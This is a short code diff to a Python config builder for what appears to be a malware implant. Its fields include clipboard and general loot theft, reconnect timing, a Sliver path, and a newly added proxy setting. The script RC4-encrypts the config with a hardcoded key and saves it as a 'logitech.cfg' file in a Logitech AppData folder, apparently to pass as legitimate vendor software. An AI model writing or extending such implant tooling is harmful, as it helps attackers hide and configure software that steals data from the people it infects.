@@ -24,6 +24,7 @@ config.ReconnectInterval = data['ReconnectInterval']
 config.SliverPath = data['SliverPath']
 config.LootClipboard = data['Clipboard']
 config.Loot = data['Loot']
+config.Proxy = data['Proxy']
 
 config.Protocol = data['Protocol']
 config.Type = data['Type']
@@ -81,7 +82,6 @@ marshaled_data = config.SerializeToString()
 hexdump(marshaled_data)
 cipher = ARC4.new(b'config_key')
 ciphertext = cipher.encrypt(marshaled_data)
-hexdump(ciphertext)
 open('.\\x64\\Debug\\logitech.cfg', 'wb').write(ciphertext)
 open('C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\logitech.cfg', 'wb').write(ciphertext)
 f.close()
